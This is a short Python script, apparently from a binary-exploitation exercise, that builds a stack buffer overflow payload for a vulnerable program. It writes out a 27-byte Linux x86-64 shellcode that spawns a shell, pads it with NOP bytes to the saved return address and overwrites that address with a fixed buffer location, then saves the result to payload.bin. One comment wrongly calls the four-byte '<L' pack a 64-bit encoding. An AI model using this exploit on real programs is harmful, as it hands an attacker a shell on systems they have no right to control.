import struct

#   0x7fffffffe1b0 buffer (local variable at vuln())
#   0x7fffffffe228 $rip
# - ___________________
#             -120 bytes difference   (decimal)


#0x404080 big_boy_buffer

# 27 bytes payload, found it on the internet. It spawns a shell fox Linux x86/64 bit architecture
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

shellcode += b"\x90" * 93

# new rip = address of BigBoyBuffer so the next instruction will be the one inside the buffer (in this case the shellcode)
shellcode += struct.pack("<L",0x404080) #L is 64 bit encoding e.g 0x7fff... and < means little endianess

f = open( "payload.bin" , "wb" )
f.write(shellcode)